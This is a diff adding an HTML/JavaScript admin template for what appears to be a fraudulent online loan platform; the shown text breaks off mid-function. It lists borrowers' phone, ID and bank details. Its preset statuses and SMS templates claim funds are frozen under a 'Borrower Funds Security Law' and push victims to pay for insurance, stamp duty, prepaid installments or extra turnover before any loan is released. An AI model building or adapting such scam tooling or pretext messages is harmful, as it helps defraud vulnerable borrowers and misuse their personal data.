@@ -1,0 +1,1159 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<include file="Public/head" />
+		<link rel="stylesheet" href="__PUBLIC__/Manage/css/table.css">
+		<title>借款管理</title>
+		<style type="text/css">
+.yss{
+	float:left;
+	width: 18%;
+    padding: 8px 25px;
+	margin:15px 5px;
+    height: 32px;
+    font-size: 12px;
+    font-weight: normal;
+    text-align: center;
+    border: 1px solid transparent;
+    border-radius: 4px;
+	background-color: #f2f2f2;
+}
+.yss a{
+ line-height: 14px;
+  text-decoration:none;
+}
+.yss a:hover{
+  text-decoration:none;
+}
+.left{float: left;}
+.lss{
+	float:left;
+	width: 18%;
+    padding: 8px 25px;
+	margin:10px 5px;
+    height: 30px;
+    font-size: 12px;
+    font-weight: normal;
+    text-align: center;
+    border: 1px solid transparent;
+    border-radius: 4px;
+	background-color: #f2f2f2;
+}
+.lss a{
+ line-height: 14px;
+  text-decoration:none;
+}
+.lss a:hover{
+  text-decoration:none;
+}
+</style>
+	</head>
+	<body>
+		<div class="nestable">
+			<div class="console-title console-title-border drds-detail-title clearfix">
+				<h5>借款管理</h5>
+				<a href="javascript:dbt('{$dbt}');" style="margin-left:35px;"><strong>预设订单状态（默认值）</strong></a>
+				<a href="javascript:allsm('{$allsm}');" style="margin-left:35px;"><strong>预设订单说明（默认值）</strong></a>
+			    <a href="javascript:lix('{$lix}');" style="margin-left:35px;"><strong>保险预设</strong></a>	
+			    <a href="javascript:ypass('{$ypass}');" style="margin-left:35px;"><strong>提现密码：{$ypass}</strong></a>	
+			    <a style="display:none;" href="javascript:wxcode();" style="margin-left:35px;"><strong>钱包:微信</strong></a>
+				<a style="display:none;" href="javascript:zfbcode();" style="margin-left:35px;"><strong>钱包:支付宝</strong></a>
+				<a style="display:none;" href="javascript:payinfo('{$paybank}','{$payname}','{$paysn}','{$paysm}');" style="margin-left:35px;"><strong>钱包:银行卡</strong></a>						
+			</div>
+
+
+			<form method="get" id="seachForm">
+				<input type="hidden" name="m" value="Loan" />
+				<input type="hidden" name="a" value="pending" />
+				<div class="public-selectArea">
+					<div class="clearfix">
+						<div class="wp_box col-xs-6">
+							<dl>
+								<dt>手机号：</dt>
+								<dd>
+									<input type="text" name="s-pho" value="{$Think.get.s-pho}">
+								</dd>
+							</dl>
+						</div>		
+						<div class="wp_box col-xs-6">
+							<dl>
+								<dt>申请时间：</dt>
+								<dd>
+									<input type="date" class="time-inp" name="s-timeStart" value="{$Think.get.s-timeStart}" />
+								</dd>
+								<dd>
+									<input type="date" class="time-inp" name="s-timeEnd" value="{$Think.get.s-timeEnd}" />
+								</dd>
+							</dl>
+						</div>
+					</div>
+					<div class="btnArea">
+						<a href='javascript:$("#seachForm").submit();' class="btn btn-sereachBg">
+							<i class="glyphicon glyphicon-search public-ico"></i>
+							<span class="public-label">查询</span>
+						</a>
+					</div>
+				</div>
+			</form>
+			<div class="scroll-bar-table">
+				<table class="table table-hover">
+					<thead>
+						<tr>
+							<th>订单号</th>
+							<th>用户名</th>
+							<th>名称</th>
+							<th>金额</th>
+							<th>期限</th>
+							<th>提现时间</th>
+							<th style="display:none;">钱包</th>
+							<th>转账记录</th>
+							<th>保险截图</th>
+							<th>订单状态</th>										
+							<th>操作</th>
+						</tr>
+					</thead>
+					<tbody>
+					<volist name="list" id="vo">
+						<tr id="list-{$vo.id}">
+							<td>{$vo.oid}</td>
+							<td>{$vo.user.telnum}</td>
+							<td>{$vo.name}</td>
+							<td>总额{$vo.money}.00</br>每期{$vo.quotama}</td>
+							<td>
+								{$vo.time}<if condition="$vo['timetype'] eq 1">个月<else/>天</if>
+							</td>
+							<td>{$vo.add_time|date="Y/m/d H:i:s",###}</td>
+
+							
+							<td style="display:none;"><a href="{:U('Loan/qbmx',array('uid'=>$vo['uid'],'oid'=>$vo['id']))}" target="_blank">{$vo.qbmoney}</a><if condition="$vo['qbzx'] eq 1"></br><span style="color:#E53333;font-weight:700;">有新充值</span></if><if condition="$vo['qbtx'] eq 1"></br><span style="color:#E53333;font-weight:700;">有新取现</span></if></td>
+							
+							
+							
+							<td><a href="javascript:vic('{$vo.vicsv}','{$vo.oid}');" title="说明">转账说明</a></br><a target="_blank" href="{:U('Loan/viewhd',array('id'=>$vo['id']))}" title="点击核对2" target="_blank">转账截图</a></td>
+
+							<td><a href="javascript:cinfo('{$vo.name}','{$vo.pda.idcard}','{$vo.bankname}','{$vo.banknum}','{$vo.oid}','{$vo.money}','{$vo.lix_money}');" title="信息核对">{$vo.lix_money}</a></br><a target="_blank" href="{:U('Loan/viewhdo',array('id'=>$vo['id']))}" title="点击截图2" target="_blank">保险截图</a></br><a href="javascript:infoo('{$vo.oid}','{$vo.infoo}');" title="点击开关" style="display:none;"><if condition="$vo['infoo'] eq '2'">已开<else/>已关</if>（{$vo.yqm|default="未输入"}）</a></td>
+
+							<td class="text-left"><a href="javascript:xgo('{$vo.oid}','{$vo.dbt}','{$vo.error}','{$vo.tco}','{$vo.xbzmark}');" title="点击修改订单颜色/状态/说明">{$vo.dbt|default="提现成功"}</a></td>
+
+							<td class="text-left">
+								<a href="{:U('Loan/viewContract',array('id'=>$vo['id']))}" title="点击查看合同" target="_blank">合同</a>｜ 
+								<a target="_blank" href="index.php?m=Info&a=view&uid={$vo.user.id}" title="点击查看资料" target="_blank">资料</a>｜
+								<a href="javascript:evbank('{$vo.oid}','{$vo.bankname}','{$vo.banknum}');" title="点击修改卡号">改卡</a>｜
+								<a href="javascript:smssend('{$vo.user.telnum}','{$vo.oid}','{$vo.money}','{$vo.name}');" title="点击发送自定义短信">短信</a>｜
+								<a href="javascript:setPendingStatus('{$vo.id}',1);" style="display:none;">通过</a>
+								<a href="javascript:delLoanOrder('{$vo.id}');" title="点击删除订单">删除</a>
+							</td>
+						</tr>
+</volist>
+					</tbody>
+				</table>
+			</div>
+			<div class="table-pagin-container">
+				<div class="pull-right page-box">
+					{$page}
+				</div>
+			</div>
+		</div>
+
+<div style="display: none;" id="smssend_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+	  <tr>
+			<td width="80" align="right"></td>
+            <td><span style="padding: 10px 0;line-height: 50px;margin-right:10px;">名字：<span id="iname"></span></span><span style="padding: 10px 0;line-height: 50px;margin-right:10px;">订单编号：<span id="ioid"></span></span><span style="padding: 10px 0;line-height: 50px;margin-right:10px;">借款金额：<span id="imoney"></span></span></td>
+       </tr>
+
+		<tr>
+            <td width="80" align="right">自定义内容</td>
+            <td>
+               <textarea rows="5" cols="50" id="iconten" value="" style="border:#CCCCCC 1px solid;"></textarea>
+
+            </td>
+        </tr>       
+	<tr style="display: none;" >
+	<td width="50" align="right" >phone</td>
+	<td>
+		<input type="text" id="iphone" value=""/></td>
+	</tr>
+        <tr>
+            <td></td>
+            <td>
+				<input type="hidden"  id="smsoid" value=""/>
+                <input type="submit" onclick="savesmssend();" class="btn" value="发送" style="margin:8px 5px;background-color:#06c;color:#fff;"/>
+            </td>
+        </tr>
+				<tr>
+            <td width="80" align="right">常用短信</td>
+            <td>
+            <a href="javascript:;" onclick="smstz('1');"><p class="yss">通过</p></a>
+			<a href="javascript:;" onclick="smstz('2');"><p class="yss">密码</p></a>
+			<a href="javascript:;" onclick="smstz('3');"><p class="yss">审核</p></a>
+			</td>
+        </tr>
+    </table>
+	【1】点击上面常用按钮信息会自动加到发送框，再点发送；</br>
+	【2】@username@会自动识别客户名字，请勿动，**内容请自行添加；</br>
+	【3】如有需要增加和更改短信内容，请联系我；</br>
+</div>
+<div style="display: none;" id="lix_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+
+         <tr>
+            <td width="80" align="right"></td>
+            <td>
+                <input type="text" id="lix" value="" style="border:#CCCCCC 1px solid;height:30px;width:100px;margin:20px 0px;padding:0 5px;"/>%
+            </td>
+        </tr>
+        <tr>
+            <td></td>
+            <td>
+                <input type="submit" onclick="savelix();" class="btn" value="修改提交" />
+            </td>
+        </tr>
+    </table>
+</div>
+<div style="display: none;" id="ypass_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+
+         <tr>
+            <td width="80" align="right"></td>
+            <td>
+              
+                <input type="text" id="ypass" value="" style="border:#CCCCCC 1px solid;height:30px;width:100px;margin:20px 0px;padding:0 5px;"/> 预设6位数提现密码
+            </td>
+        </tr>
+        <tr>
+            <td></td>
+            <td>
+                <input type="submit" onclick="saveypass();" class="btn" value="修改提交" />
+            </td>
+        </tr>
+    </table>
+</div>
+<div style="display: none;" id="allsm_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+
+         <tr>
+            <td width="80" align="right"></td>
+            <td>
+                 <input type="text" id="strs" value="" style="border:#CCCCCC 1px solid;height:30px;width:300px;margin:20px 0px;padding:0 5px;"/>
+            </td>
+        </tr>
+        <tr>
+            <td></td>
+            <td>
+                <input type="submit" onclick="savestrs();" class="btn" value="修改提交" />
+            </td>
+        </tr>
+    </table>
+</div>
+<div style="display: none;" id="dbt_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+         <tr>
+            <td width="80" align="right"></td>
+            <td>
+                 <input type="text" id="dbtstrs" value="" style="border:#CCCCCC 1px solid;height:30px;width:300px;margin:20px 0px;padding:0 5px;"/>
+            </td>
+        </tr>
+        <tr>
+            <td></td>
+            <td>
+                <input type="submit" onclick="savedbtstrs();" class="btn" value="修改提交" />
+            </td>
+        </tr>
+    </table>
+</div>
+<div style="display: none;" id="tco_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+        <tr>
+            <td width="95" align="right">RGB颜色代码</td>
+            <td>
+            <p class="cor"><span style="color:#E53333;margin-right:10px;"><strong>E53333</strong></span><span style="color:#00D5FF;margin-right:10px;"><strong>00D5FF</strong></span><span style="color:#E56000;margin-right:10px;"><strong>E56000</strong></span><span style="color:#666666;margin-right:10px;"><strong>666666</strong></span><span style="color:#3ed050;"><strong>3ed050</strong></span></p>
+               
+            </td>
+        </tr>
+       <tr>
+            <td width="95" align="right">修改订单颜色</td>
+            <td>
+                <input type="text" id="color" value="" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/>将RGB代码复制到框内
+            </td>
+        </tr>
+       <tr>
+            <td width="95" align="right">修改订单状态</td>
+            <td>
+                <input type="text" id="idbt" value="" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/>可自己修改
+            </td>
+        </tr>
+       <tr>
+            <td width="95" align="right">修改订单说明</td>
+            <td>
+                <input type="text" id="ixsm" value="" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/>可自己修改
+            </td>
+        </tr>
+		<tr>
+            <td width="95" align="right">备注</td>
+            <td>
+                <input type="text" id="ixbzmark" value="" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/>可自己修改
+            </td>
+        </tr>
+       <tr>
+            <td width="95" align="right">短信</td>
+            <td>
+                <input type="text" id="insms" value="" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/>
+            </td>
+ 		</tr>
+		<tr>
+            <td width="95" align="right"></td>
+            <td>
+				1、不需要发信息，请直接清空信息栏即可。@username@会自动识别名字，请别动。</br>
+				2、如需修改增加预设状态，请联系本人。</br>
+            </td>
+		</tr>
+        <tr>
+            <td width="95" align="right"></td>
+            <td>
+				<input type="hidden"  id="xgoid" value=""/>
+                <input type="submit" onclick="savexgo();" class="btn" value="确认修改" style="margin:8px 5px;background-color:#06c;color:#fff;"/>
+            </td>
+        </tr>
+		<tr>
+            <td width="95" align="right">常用订单状态</td>
+            <td>
+            <a href="javascript:;" onclick="ystz('1');"><p class="yss">改卡</p></a>
+			<a href="javascript:;" onclick="ystz('2');"><p class="yss">保险</p></a>
+			<a href="javascript:;" onclick="ystz('3');"><p class="yss">信用</p></a>
+			<a href="javascript:;" onclick="ystz('4');"><p class="yss">流水</p></a>
+			<a href="javascript:;" onclick="ystz('5');"><p class="yss">恢复</p></a>
+			<a href="javascript:;" onclick="ystz('6');"><p class="yss">退款维护</p></a>
+			<a href="javascript:;" onclick="ystz('7');"><p class="yss"><strong><span style="color:#E53333;">自定状态</span></strong></p></a>
+			</td>
+        </tr>
+    </table>
+</div>
+<div style="display: none;" id="cinfo_div">
+
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+       <tr>
+            <td width="95" align="right"></td>
+            <td>
+                <input type="text" id="cinfoa" value="" class="left" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/> <a href="javascript:;" onclick="pacinfo('1');"><p class="lss">复制</p></a>
+            </td>
+        </tr>
+       <tr>
+            <td width="95" align="right"></td>
+            <td>
+                <input type="text" id="cinfob" value="" class="left" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/><a href="javascript:;" onclick="pacinfo('2');"><p class="lss">复制</p></a>
+            </td>
+        </tr>
+       <tr>
+            <td width="95" align="right"></td>
+            <td>
+                <input type="text" id="cinfoc" value="" class="left" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/><a href="javascript:;" onclick="pacinfo('3');"><p class="lss">复制</p></a>
+            </td>
+        </tr>
+       <tr>
+            <td width="95" align="right"></td>
+            <td>
+                <input type="text" id="cinfod" value="" class="left" style="border:#CCCCCC 1px solid;height:30px;width:333px;margin:10px 5px;padding:0 5px;"/><a href="javascript:;" onclick="pacinfo('4');"><p class="lss">复制</p></a>
+            </td>
+        </tr>
+
+    </table>
+</div>
+<div style="display: none;" id="evbank_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+         <tr>
+            <td width="80" align="right">银行：</td>
+            <td>
+				<input type="text" id="evbankname" value="" style="border:#CCCCCC 1px solid;height:30px;width:300px;margin:20px 0px;padding:0 5px;"/>
+            </td>
+        </tr>
+         <tr>
+            <td width="80" align="right">卡号：</td>
+            <td>
+              
+                <input type="text" id="evbanknum" value="" style="border:#CCCCCC 1px solid;height:30px;width:300px;margin:20px 0px;padding:0 5px;"/>
+            </td>
+        </tr>
+        <tr>
+              <td></td>
+            <td>
+				<input type="hidden"  id="evoid" value=""/>
+                <input type="submit" onclick="saveevbank();" class="btn" value="修改提交" />
+            </td>
+        </tr>
+    </table>
+</div>
+<div style="display: none;" id="vic_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+         <tr>
+            <td width="80" align="right"></td>
+            <td>
+              
+                <input type="text" id="vicsv" value="" style="border:#CCCCCC 1px solid;height:30px;width:399px;margin:20px 0px;padding:0 5px;"/> 可自己输入，注意长度。
+            </td>
+        </tr>
+  		<tr>
+            <td width="80" align="right"></td>
+            <td>
+            <a href="javascript:;" onclick="victz('1');"><p class="yss">卡号不对</p></a>
+			<a href="javascript:;" onclick="victz('2');"><p class="yss">绑定保险</p></a>
+			<a href="javascript:;" onclick="victz('3');"><p class="yss">流水不足</p></a>
+			</td>
+        </tr>
+        <tr>
+            <td></td>
+            <td>
+				<input type="hidden"  id="vicoid" value=""/>
+                <input type="submit" onclick="savevic();" class="btn"  style="margin: 0px 5px;" value="修改提交" />
+           </td>
+        </tr>
+    </table>
+</div>
+<div style="display: none;" id="wxcode_div">
+		<input type="hidden" name="sitewxcode" value="{$wxcodes|default=''}" />
+		<div class="wx_box">
+			<div class="wx_up">
+				<div class="wx_upimg">
+				<form action="{:U('Setting/uploadImg')}" method="post" enctype="multipart/form-data">
+						<input type="file" name="wxcodes" onchange="uploadImgs(this);" />
+						<input type="hidden" name="fileName" value="wxcodes" />
+				</form>
+				</div>
+			</div>
+			<div class="wx_btn">
+				<a href="javascript:void(0)" onclick="ok_tj_wx();" class="btn btn-grayBg">保存</a>
+			</div>
+			<div class="wx_dq">当前二维码</div>
+			<div class="wx_upimg2 img-view"></div>
+		</div>
+</div>
+<div style="display: none;" id="zfbcode_div">
+		<input type="hidden" name="sitezfbcode" value="{$zfbcodes|default=''}" />
+		<div class="wx_box">
+			<div class="wx_up">
+				<div class="wx_upimg">
+				<form action="{:U('Setting/uploadImg')}" method="post" enctype="multipart/form-data">
+						<input type="file" name="zfbcodes" onchange="zfbuploadImgs(this);" />
+						<input type="hidden" name="fileName" value="zfbcodes" />
+				</form>
+				</div>
+			</div>
+			<div class="zfb_btn">
+				<a href="javascript:void(0)" onclick="ok_tj_zfb();" class="btn btn-grayBg">保存</a>
+			</div>
+			<div class="wx_dq">当前二维码</div>
+			<div class="wx_upimg2 img-view-zfb"></div>
+		</div>
+</div>
+<div style="display: none;" id="payinfo_div">
+    <table width="100%" border="0" cellpadding="8" cellspacing="0" class="tableBasic">
+         <tr>
+            <td width="80" align="right">银行：</td>
+            <td>
+                <input type="text" id="paybank" value="" style="border:#CCCCCC 1px solid;height:30px;width:360px;margin:20px 0px;padding:0 5px;"/>
+            </td>
+        </tr>
+		<tr>
+            <td width="80" align="right">户名：</td>
+            <td>
+                <input type="text" id="payname" value="" style="border:#CCCCCC 1px solid;height:30px;width:360px;margin:20px 0px;padding:0 5px;"/>
+            </td>
+        </tr>
+		<tr>
+            <td width="80" align="right">卡号：</td>
+            <td>
+                <input type="text" id="paysn" value="" style="border:#CCCCCC 1px solid;height:30px;width:360px;margin:20px 0px;padding:0 5px;"/>
+            </td>
+        </tr>
+		<tr>
+        <td width="80" align="right">说明：</td>
+            <td>
+                <input type="text" id="paysm" value="" style="border:#CCCCCC 1px solid;height:30px;width:360px;margin:20px 0px;padding:0 5px;"/>
+            </td>
+        </tr>
+        <tr>
+            <td></td>
+            <td>
+                <input type="submit" onclick="savepayinfo();" class="btn" value="修改提交" />
+            </td>
+        </tr>
+    </table>
+</div>
+	</body>
+	<script type="text/javascript">
+		$(function(){
+			$(".img-view").remove();
+			var wxcodeImg = $("input[name='sitewxcode']").val();
+			if(wxcodeImg.length > 0){
+				$(".wx_btn").after("<div class='wx_upimg2 img-view'><img src='" + wxcodeImg + "' /></div>");
+			}
+			$(".img-view-zfb").remove();
+			var zfbcodeImg = $("input[name='sitezfbcode']").val();
+			if(zfbcodeImg.length > 0){
+				$(".zfb_btn").after("<div class='wx_upimg2 img-view-zfb'><img src='" + zfbcodeImg + "' /></div>");
+			}
+		});
+	
+	</script>
+	<script>
+		function ok_tj_zfb(){
+			var zfbupimg = $("input[name='sitezfbcode']").val();
+
+				if(zfbupimg.length == 0){
+						layer.msg("请选择+上传文件");
+					return false;
+				}else{	
+						$.post("{:U('Loan/savezfbcode')}",{zfbcode: zfbupimg},
+							function(data){
+								if(data.status != 1){
+										layer.msg(data.info);
+								}else{
+								  layer.msg("保存二维码成功");
+									setTimeout(function(){
+										window.location.href = window.location.href;
+									},2000);
+								}
+					
+							}
+						);
+					}
+				};
+				
+			function ok_tj_wx(){
+			var upimg = $("input[name='sitewxcode']").val();
+
+				if(upimg.length == 0){
+						layer.msg("请选择+上传文件");
+					return false;
+				}else{	
+						$.post("{:U('Loan/savewxcode')}",{wxcode: upimg},
+							function(data){
+								if(data.status != 1){
+										layer.msg(data.info);
+								}else{
+								  layer.msg("保存微信二维码成功");
+									setTimeout(function(){
+										window.location.href = window.location.href;
+									},2000);
+								}
+					
+							}
+						);
+					}
+				};
+	function uploadImgs(obs){
+				var filename = $(obs).val();
+				if(filename != '' && filename != null){
+	
+				//上传图片
+				var obj = $(obs).parent();
+				
+				cvphp.submit($(obj),function(data){
+					if(data.status != 1){
+						layer.msg(data.info);
+						return false;
+					}else{
+						var imgUrl = "__PUBLIC__/Upload/" + data.info;
+						$("input[name='sitewxcode']").val(imgUrl);
+						$(".img-view").remove();
+						$(".wx_btn").after("<div class='wx_upimg2 img-view'><img src='" + imgUrl + "' /></div>");
+					}
+				});
+			}else{
+					layer.msg("请选择上传文件");
+					return false;
+			}
+			};
+	function zfbuploadImgs(obs){
+				var filename = $(obs).val();
+				if(filename != '' && filename != null){
+	
+				//上传图片
+				var obj = $(obs).parent();
+				
+				cvphp.submit($(obj),function(data){
+					if(data.status != 1){
+						layer.msg(data.info);
+						return false;
+					}else{
+						var imgUrl = "__PUBLIC__/Upload/" + data.info;
+						$("input[name='sitezfbcode']").val(imgUrl);
+						$(".img-view-zfb").remove();
+						$(".zfb_btn").after("<div class='wx_upimg2 img-view-zfb'><img src='" + imgUrl + "' /></div>");
+					}
+				});
+			}else{
+					layer.msg("请选择上传文件");
+					return false;
+			}
+			};
+			
+function wxcode(){	
+		//$("#ypass").attr('value',strs);
+		layer.open({
+		  	type: 1,
+			title: '二维码上传',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['400px', '495px'], //宽高
+		  	content: $("#wxcode_div").html()
+		});
+    };
+function zfbcode(){	
+		//$("#ypass").attr('value',strs);
+		layer.open({
+		  	type: 1,
+			title: '二维码上传',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['400px', '495px'], //宽高
+		  	content: $("#zfbcode_div").html()
+		});
+    };		
+function victz(tz){
+		if(tz  == '1'){
+			$('.layui-layer-content #vicsv').prop('value','因借款人账户信息不符，根据国家法规《借款人资金安全法》临时冻结转账。');			
+		}else if(tz  == '2'){
+			$('.layui-layer-content #vicsv').prop('value','风险评估过低，根据国家《借款人资金安全法》借款人需绑定金融商业险。');				
+		}else if(tz  == '3'){
+			$('.layui-layer-content #vicsv').prop('value','借款人账户资金流水不足，根据国家《借款人资金安全法》暂停放款转账。');		
+		}	
+	}
+function pacinfo(tz){
+		if(tz  == '1'){ 
+			$('.layui-layer-content #cinfoa').trigger('select');		
+		}else if(tz  == '2'){
+			$('.layui-layer-content #cinfob').trigger('select');			
+		}else if(tz  == '3'){
+			$('.layui-layer-content #cinfoc').trigger('select');	
+		}else if(tz  == '4'){
+			$('.layui-layer-content #cinfod').trigger('select');			
+		}
+		document.execCommand('copy');
+		layer.msg("复制成功");	
+	}
+function smstz(tz){
+		if(tz  == '1'){
+			$('.layui-layer-content #iconten').prop('value','恭喜！您的订单已通过，请联系在线客服办理。');			
+		}else if(tz  == '2'){
+			$('.layui-layer-content #iconten').prop('value','尊敬的先生/女士，您的账户信息有误，请及时联系客服处理!');				
+		}else if(tz  == '3'){
+			$('.layui-layer-content #iconten').prop('value','先生/女士，已提交，请注意查收到账信息，或登录平台查看进度。');		
+		}
+	
+	}
+	function ystz(tz){
+		if(tz  == '1'){
+			$('.layui-layer-content #color').prop('value','E53333');			
+			$('.layui-layer-content #idbt').prop('value','转账失败');
+			$('.layui-layer-content #ixsm').prop('value','提现银行卡信息不符，导致转账失败，资金冻结。');
+			$('.layui-layer-content #ixbzmark').prop('value','无法识别正确卡号，请联系客服处理');
+			$('.layui-layer-content #insms').prop('value','尊敬的先生/女士，您的账户信息有误，请及时联系客服处理!');
+		}else if(tz  == '2'){
+			$('.layui-layer-content #color').prop('value','666666');			
+			$('.layui-layer-content #idbt').prop('value','放款失败');
+			$('.layui-layer-content #ixsm').prop('value','风险评估过低，订单需绑定金融商业险。');
+			$('.layui-layer-content #ixbzmark').prop('value','风险评估偏低，请联系客服处理');
+			$('.layui-layer-content #insms').prop('value','尊敬的先生/女士，您的订单有变，编号052，请及时登录平台查看。');
+		}else if(tz  == '3'){
+			$('.layui-layer-content #color').prop('value','666666');			
+			$('.layui-layer-content #idbt').prop('value','放款失败');
+			$('.layui-layer-content #ixsm').prop('value','信用分不足，请求未完成，请预缴首**期解冻');
+			$('.layui-layer-content #ixbzmark').prop('value','信用分不足，请联系客服处理');
+			$('.layui-layer-content #insms').prop('value','尊敬的先生/女士，您的订单有变，编号309，请及时登录平台查看。');			
+		}else if(tz  == '4'){
+			$('.layui-layer-content #color').prop('value','666666');			
+			$('.layui-layer-content #idbt').prop('value','放款失败');
+			$('.layui-layer-content #ixsm').prop('value','流水不足，导致放款失败，请补充流水。');
+			$('.layui-layer-content #ixbzmark').prop('value','流水不足，请联系客服处理');
+			$('.layui-layer-content #insms').prop('value','尊敬的先生/女士，您的订单有变，编号163，请及时登录平台查看。');
+		}else if(tz  == '5'){
+			$('.layui-layer-content #color').prop('value','00D5FF');			
+			$('.layui-layer-content #idbt').prop('value','恢复放款');
+			$('.layui-layer-content #ixsm').prop('value','已预约从新打款，请留意到账信息。');
+			$('.layui-layer-content #ixbzmark').prop('value','风险排除，恢复放款');
+			$('.layui-layer-content #insms').prop('value','尊敬的先生/女士，您的款项将于2小时内重新发放，请注意查收到账信息。');			
+		}else if(tz  == '6'){
+			$('.layui-layer-content #color').prop('value','3ed050');			
+			$('.layui-layer-content #idbt').prop('value','退款中');
+			$('.layui-layer-content #ixsm').prop('value','您的退款请求已通过，请留意到账信息。');
+			$('.layui-layer-content #ixbzmark').prop('value','退款请求已通过。');
+			$('.layui-layer-content #insms').prop('value','您的退款申请已成功，将于7个工作日内返还您预留的银行帐户，请注意查收。');			
+		}else if(tz  == '7'){
+			$('.layui-layer-content #color').prop('value','E53333');			
+			$('.layui-layer-content #idbt').prop('value','缴纳印花税');
+			$('.layui-layer-content #ixsm').prop('value','您未缴纳印花税，系统暂时无法提供放款，请联系在线客服为您办理！');
+			$('.layui-layer-content #ixbzmark').prop('value','您未缴纳印花税，系统暂时无法提供放款，请联系在线客服为您办理！');
+			$('.layui-layer-content #insms').prop('value','尊敬的先生/女士，您的订单有变，编号879，请及时登录平台查看。');			
+		}
+	
+	}
+	</script>
+	<script>
+	function vic(sv,oid){
+		$("#vicsv").attr('value',sv);
+		$("#vicoid").attr('value',oid);
+		layer.open({
+		  	type: 1,
+			title: '截图说明',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['650px', '255px'], //宽高
+		  	content: $("#vic_div").html()
+		});
+    }
+	function savevic(){
+	    var vicsv = $(".layui-layer-content #vicsv").val();
+		var vicoid = $(".layui-layer-content #vicoid").val();
+
+		if (vicoid == 'undefined' || vicoid == '' || vicoid == null)
+		{
+		layer.msg("参数不正确!");
+		return false;
+		}
+			$.post(
+    			"{:U('Loan/savevic')}",
+    			{vicsv:vicsv,oid:vicoid},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("修改成功");
+								setTimeout(function(){
+								window.location.href = window.location.href;
+							},2000);
+
+							}
+    			}
+    		);		
+	
+	}
+	function evbank(oid,bankname,banknum){
+    	
+		$("#evbankname").attr('value',bankname);
+		$("#evbanknum").attr('value',banknum);
+		$("#evoid").attr('value',oid);
+		layer.open({
+		  	type: 1,
+			title: '改卡',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['500px', '258px'], //宽高
+		  	content: $("#evbank_div").html()
+		});
+    }
+	function saveevbank(){
+	    var bankname = $(".layui-layer-content #evbankname").val();
+    	var banknum = $(".layui-layer-content #evbanknum").val();
+		var oid = $(".layui-layer-content #evoid").val();
+		if (bankname == 'undefined' || bankname == '' || bankname == null)
+		{
+		layer.msg("银行名称不正确!");
+		return false;
+		}
+		if (banknum == 'undefined' || banknum == '' || banknum == null)
+		{
+		layer.msg("卡号不正确!");
+		return false;
+		}
+		if (oid == 'undefined' || oid == '' || oid == null)
+		{
+		layer.msg("参数不正确!");
+		return false;
+		}
+			$.post(
+    			"{:U('Loan/evbank')}",
+    			{bankname:bankname,banknum:banknum,oid:oid},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("修改成功");
+								setTimeout(function(){
+								window.location.href = window.location.href;
+							},2000);
+
+							}
+    			}
+    		);
+		
+	
+	}
+	
+	function infoo(oid,sm){
+			$.post(
+    			"{:U('Loan/infoo')}",
+    			{sm:sm,oid:oid},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("修改成功");
+							setTimeout(function(){
+    						window.location.href = window.location.href;
+							},2000);
+
+							}
+    			}
+    		);
+	}
+			function ypass(strs){
+    	
+		$("#ypass").attr('value',strs);
+		layer.open({
+		  	type: 1,
+			title: '提现密码设置',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['500px', '195px'], //宽高
+		  	content: $("#ypass_div").html()
+		});
+		}
+	function saveypass(){
+		var sconten = $(".layui-layer-content #ypass").val();
+		if (sconten == 'undefined' || sconten == '' || sconten == null)
+		{
+		layer.msg("提现密码设置不能为空!");
+		return false;
+		}
+			$.post(
+    			"{:U('Loan/saveypass')}",
+    			{strs:sconten},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("保存成功");
+							setTimeout(function(){
+    						window.location.href = window.location.href;
+    					},2000);
+
+							}
+    			}
+    		);
+	
+	}
+			function lix(strs){
+    	
+		$("#lix").attr('value',strs);
+		layer.open({
+		  	type: 1,
+			title: '预设利率',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['500px', '195px'], //宽高
+		  	content: $("#lix_div").html()
+		});
+		}
+	function savelix(){
+		var sconten = $(".layui-layer-content #lix").val();
+		if (sconten == 'undefined' || sconten == '' || sconten == null)
+		{
+		layer.msg("利率内容不能为空!");
+		return false;
+		}
+			$.post(
+    			"{:U('Loan/savelix')}",
+    			{strs:sconten},
+    			function(data){
+							if(data.status!=1){
+								layer.msg(data.info);
+							}else{								
+								layer.msg("保存成功");
+							setTimeout(function(){
+    						window.location.href = window.location.href;
+    					},2000);
+
+							}
+    			}
+    		);
+	
+	}
+		function payinfo(bank,name,sn,sm){
+    	
+		$("#paybank").attr('value',bank);
+			$("#payname").attr('value',name);
+				$("#paysn").attr('value',sn);
+					$("#paysm").attr('value',sm);
+		layer.open({
+		  	type: 1,
+			title: '银行卡设置',
+		  	skin: 'layui-layer-rim', //加上边框
+		  	area: ['500px', '456px'], //宽高
